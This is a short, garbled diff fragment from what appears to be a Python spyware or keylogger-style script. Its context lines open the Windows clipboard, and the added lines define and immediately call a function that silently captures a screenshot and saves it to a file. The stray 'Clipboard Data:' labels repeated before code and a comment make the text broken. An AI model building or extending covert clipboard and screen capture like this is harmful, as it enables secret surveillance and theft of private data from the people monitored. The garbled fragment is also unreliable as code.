@@ -4,3 +4,9 @@ Clipboard Data:             win32clipboard.OpenClipboard()
 
 Clipboard Data:             win32clipboard.OpenClipboard()
 
+Clipboard Data: # get screenshots
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(file_path + extend + screenshot_information)
+
+screenshot()
